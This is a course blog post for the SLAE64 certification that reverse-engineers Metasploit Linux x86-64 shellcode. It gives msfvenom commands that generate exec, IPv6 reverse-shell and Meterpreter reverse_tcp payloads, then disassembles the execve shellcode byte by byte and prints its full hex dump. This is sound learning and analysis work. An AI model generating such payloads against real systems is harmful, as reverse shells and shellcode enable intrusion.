Assignment #5 – Metasploit Shellcode Analysis
=============================================

In this assignment I will reverse three diferent Linux x86-64 shellcodes produced by Metasploit. I picked three shelcodes at random discounting the stageless Meterpreter ones (which are huge).

    $ msfvenom -l payloads | grep linux/x64 | grep -v stageless | shuf -n 3
    linux/x64/meterpreter/reverse_tcp    Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/shell_reverse_ipv6_tcp     Connect back to attacker and spawn a command shell over IPv6
    linux/x64/exec                       Execute an arbitrary command

For each shellcode I used `msfvenom` to produce both an ELF file and a raw file which will be used during reversing.

    msfvenom -p linux/x64/exec CMD=whoami -f elf > linux-x64-exec
    msfvenom -p linux/x64/exec CMD=whoami -f raw > linux-x64-exec.raw
    msfvenom -p linux/x64/shell_reverse_ipv6_tcp LHOST=::1 -f elf > linux-x64-shell_reverse_ipv6_tcp
    msfvenom -p linux/x64/shell_reverse_ipv6_tcp LHOST=::1 -f raw > linux-x64-shell_reverse_ipv6_tcp.raw
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 -f elf > linux-x64-meterpreter-reverse_tcp
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 -f raw > linux-x64-meterpreter-reverse_tcp.raw

linux/x64/exec
--------------

Fist I checked that the ELF was working as intended, i.e. that it executed `whoami`.

    $ msfvenom -p linux/x64/exec CMD=whoami -f elf > linux-x64-exec
    $ ./linux-x64-exec
    goncalor

Then, I wanted to know which syscalls were being used. A good tool for this is `strace`, which can be used to execute a program and get information about which syscalls it executes.

    $ strace -b execve ./linux-x64-exec
    execve("./linux-x64-exec", ["./linux-x64-exec"], 0x7ffed6f7f010 /* 40 vars */) = 0
    execve("/bin/sh", ["/bin/sh", "-c", "whoami"], NULLstrace: Process 3457 detached
     <detached ...>
     goncalor

So we see that the ELF is calling `execve` and executing the command `/bin/sh -c whoami`. From [`man execve`][man_2_execve] we know this syscall receives the path to a binary/script to execute, an null terminated array of arguments to the binary/script, and a null terminated array with environment variables. And from the output of `strace` we already know what is being put into each of these arguments.

    int execve(const char *pathname, char *const argv[], char *const envp[]);

Now let's see how things are being done behing the scenes. Let's disassemle the ELF:

    $ objdump -M intel -d linux-x64-exec

    linux-x64-exec:     file format elf64-x86-64

Hm... What? No output? Well, it seems that the ELF file produced by `msfvenom` has no headers and `objdump` relies on headers to disassemble, so it's not the best tool to use here (but it could be used with `objdump -M intel,x86-64 -b binary -m i386 -D --start-address=120 linux-x64-exec`, where the 120 was obtained by doing some math with the output of `readelf -a`. Instead, let's use `ndisasm`.

    $ ndisasm -b64 linux-x64-exec.raw
    00000000  6A3B              push byte +0x3b
    00000002  58                pop rax
    00000003  99                cdq
    00000004  48BB2F62696E2F73  mov rbx,0x68732f6e69622f
              -6800
    0000000E  53                push rbx
    0000000F  4889E7            mov rdi,rsp
    00000012  682D630000        push qword 0x632d
    00000017  4889E6            mov rsi,rsp
    0000001A  52                push rdx
    0000001B  E807000000        call 0x27
    00000020  7768              ja 0x8a
    00000022  6F                outsd
    00000023  61                db 0x61
    00000024  6D                insd
    00000025  690056574889      imul eax,[rax],dword 0x89485756
    0000002B  E60F              out 0xf,al
    0000002D  05                db 0x05

The first striking thing is that there's no `syscall` instruction anywhere. After `call` there are some weird instructions which lead me to suspect that's actually data stored in the `.text` section. That data may be misaligning the next instructions and `syscall` is probably there. Since we have `call 0x27` let's try to disassemble starting at that position of the shellcode.

    $ ndisasm -b64 linux-x64-exec.raw -e 0x27 -o 0x27
    00000027  56                push rsi
    00000028  57                push rdi
    00000029  4889E6            mov rsi,rsp
    0000002C  0F05              syscall

Alright! There's the `syscall`!

The first three instructions initialise RAX and RDX.

    00000000  6A3B              push byte +0x3b    ; __NR_execve = 59 = 0x3b
    00000002  58                pop rax            ; rax = 0x3b
    00000003  99                cdq                ; rdx = 0

Then some value is pushed to the stack. Using `python` or `rax2` we can see that it's `/bin/sh` and a null byte.

    $ python
    >>> bytes.fromhex("0068732f6e69622f")
    b'\x00hs/nib/'
    >>> bytes.fromhex("0068732f6e69622f")[::-1]
    b'/bin/sh\x00'
    $ rax2 -s 0x68732f6e69622f | rev
    /bin/sh

So `/bin/sh` is pushed to the stack and RDI is used to store a pointer to that string, which makes sense since it's the first argument to `execve`. Then `-c` is pushed too. Then RDX is pushed, which was zeroed before.

    00000004  48BB2F62696E2F73  mov rbx,0x68732f6e69622f  ; "/bin/sh", 0x00
              -6800
    0000000E  53                push rbx
    0000000F  4889E7            mov rdi,rsp               ; rdi = & "/bin/sh"
    00000012  682D630000        push qword 0x632d         ; "-c", 0x00, 0x00
    00000017  4889E6            mov rsi,rsp               ; rsi = & "-c"
    0000001A  52                push rdx

Now we have a `call` which will push the next instruction's address (`0x20`) to the stack and continue exection at `0x27`. There we push RSI and RDI, the addresses for `-c` and `/bin/sh`. Finally RSI is upated to match RSP, which points to the top of the stack, or in other words the last address we pushed.

    0000001B  E807000000        call 0x27
    00000020  7768              ja 0x8a
    ...
    00000027  56                push rsi
    00000028  57                push rdi
    00000029  4889E6            mov rsi,rsp
    0000002C  0F05              syscall

So, let's see what memory and registers look like when `syscall` gets executed.

    +-----------+
    | 0x0       |    <- rdx (arg3)       (higher memory addresses)
    +-----------+
    | 0x20 (??) |
    +-----------+
    | "-c"      |
    +-----------+
    | "/bin/sh" | <┐ <- rdi (arg1)
    +-----------+  |
    | address   | -┘ <- rsi (arg2)       (lower memory addresses)
    +-----------+

As you can see all that's needed to call `execve("/bin/sh", ["/bin/sh", "-c", "whoami"], NULL)` looks in place. The missing piece is what's at address `0x20` which must be `whoami`. Let's check that. The following weird instructions are in fact a string.

<pre>
00000020  7768              ja 0x8a
00000022  6F                outsd
00000023  61                db 0x61
00000024  6D                insd
00000025  690056574889      imul eax,[rax],dword 0x89485756

$ hd linux-x64-exec.raw
00000000  6a 3b 58 99 48 bb 2f 62  69 6e 2f 73 68 00 53 48  |j;X.H./bin/sh.SH|
00000010  89 e7 68 2d 63 00 00 48  89 e6 52 e8 07 00 00 00  |..h-c..H..R.....|
00000020  <b>77 68 6f 61 6d 69 00</b> 56  57 48 89 e6 0f 05        |<b>whoami.</b>VWH....|
0000002e
</pre>

So we're all set. `execve` is executed and it executes `whoami` as intended.



[man_2_execve]: https://linux.die.net/man/2/execve

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
